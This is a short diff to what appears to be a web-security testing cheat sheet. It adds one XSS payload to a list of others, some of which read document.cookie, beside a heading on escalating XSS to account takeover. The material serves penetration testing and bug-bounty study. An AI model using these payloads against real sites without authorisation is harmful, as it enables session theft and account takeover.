@@ -2950,6 +2950,7 @@ Manually testing for XXE vulnerabilities generally involves
 - `<><img src=x onerror=alert()>`
 - `<body onresize=print() onload=this.style.width='100px'>`
 - `<xss id=x onfocus=alert(document.cookie) tabindex=1>`
+- `"><svg><animatetransform onbegin=alert(1)>`
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
 - Change email > Password reset
